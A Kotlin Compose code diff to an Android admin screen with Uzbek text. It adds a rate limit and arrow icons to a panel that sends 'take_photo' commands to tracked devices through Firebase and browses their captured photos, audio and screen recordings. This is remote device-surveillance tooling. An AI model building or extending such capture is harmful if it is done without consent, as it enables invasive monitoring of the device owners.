@@ -30,6 +30,7 @@ import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.filled.*
+import androidx.compose.material.icons.automirrored.filled.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
@@ -129,6 +130,7 @@ fun BigAdminScreen(
 
     var photoList by remember { mutableStateOf<List<PhotoItem>>(emptyList()) }
     var currentPhotoIndex by remember { mutableStateOf(0) }
+    var lastPhotoClickTime by remember { mutableStateOf(0L) }
 
     var audioList by remember { mutableStateOf<List<AudioItem>>(emptyList()) }
     var currentAudioIndex by remember { mutableStateOf(0) }
@@ -509,6 +511,12 @@ fun BigAdminScreen(
                             ) {
                                 Button(
                                     onClick = {
+                                        val now = System.currentTimeMillis()
+                                        if (now - lastPhotoClickTime < 3000L) {
+                                            Toast.makeText(context, "Iltimos, ozgina kuting...", Toast.LENGTH_SHORT).show()
+                                            return@Button
+                                        }
+                                        lastPhotoClickTime = now
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
                                         database.getReference("tracking/devices/$currentDevId/commands/take_photo").setValue(System.currentTimeMillis())
                                         val msg = if (isOnline) "Rasmga olish buyrug'i yuborildi" else "Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)"
@@ -789,7 +797,9 @@ fun BigAdminScreen(
                                             contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                                             shape = RoundedCornerShape(8.dp)
                                         ) {
-                                            Text("◀ Oldingi", fontSize = 12.sp)
+                                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null, modifier = Modifier.size(13.dp))
+                                            Spacer(modifier = Modifier.width(4.dp))
+                                            Text("Oldingi", fontSize = 12.sp)
                                         }
                                         OutlinedButton(
                                             onClick = { if (currentPhotoIndex < photoList.size - 1) currentPhotoIndex++ },
@@ -797,7 +807,9 @@ fun BigAdminScreen(
                                             contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                                             shape = RoundedCornerShape(8.dp)
                                         ) {
-                                            Text("Keyingi ▶", fontSize = 12.sp)
+                                            Text("Keyingi", fontSize = 12.sp)
+                                            Spacer(modifier = Modifier.width(4.dp))
+                                            Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null, modifier = Modifier.size(13.dp))
                                         }
                                     }
 
@@ -943,13 +955,17 @@ fun BigAdminScreen(
                                             onClick = { if (currentAudioIndex > 0) currentAudioIndex-- },
                                             enabled = currentAudioIndex > 0
                                         ) {
-                                            Text("◀ Oldingi ovoz", fontSize = 12.sp)
+                                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null, modifier = Modifier.size(13.dp))
+                                            Spacer(modifier = Modifier.width(4.dp))
+                                            Text("Oldingi ovoz", fontSize = 12.sp)
                                         }
                                         TextButton(
                                             onClick = { if (currentAudioIndex < audioList.size - 1) currentAudioIndex++ },
                                             enabled = currentAudioIndex < audioList.size - 1
                                         ) {
-                                            Text("Keyingi ovoz ▶", fontSize = 12.sp)
+                                            Text("Keyingi ovoz", fontSize = 12.sp)
+                                            Spacer(modifier = Modifier.width(4.dp))
+                                            Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null, modifier = Modifier.size(13.dp))
                                         }
                                     }
                                 }
@@ -1013,7 +1029,7 @@ fun BigAdminScreen(
                                         contentAlignment = Alignment.Center
                                     ) {
                                         Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                                            Text("▶", color = Color.White, fontSize = 48.sp)
+                                            Icon(Icons.Default.PlayArrow, contentDescription = null, tint = Color.White, modifier = Modifier.size(48.dp))
                                             Spacer(modifier = Modifier.height(6.dp))
                                             Text("Ekran Video Zapis (${currentScreen?.duration ?: 10} sek)", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                                             Spacer(modifier = Modifier.height(8.dp))
@@ -1062,7 +1078,9 @@ fun BigAdminScreen(
                                             contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                                             shape = RoundedCornerShape(8.dp)
                                         ) {
-                                            Text("◀ Oldingi", fontSize = 12.sp)
+                                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null, modifier = Modifier.size(13.dp))
+                                            Spacer(modifier = Modifier.width(4.dp))
+                                            Text("Oldingi", fontSize = 12.sp)
                                         }
                                         OutlinedButton(
                                             onClick = { if (currentScreenIndex < screenList.size - 1) currentScreenIndex++ },
@@ -1070,7 +1088,9 @@ fun BigAdminScreen(
                                             contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                                             shape = RoundedCornerShape(8.dp)
                                         ) {
-                                            Text("Keyingi ▶", fontSize = 12.sp)
+                                            Text("Keyingi", fontSize = 12.sp)
+                                            Spacer(modifier = Modifier.width(4.dp))
+                                            Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null, modifier = Modifier.size(13.dp))
                                         }
                                     }
 
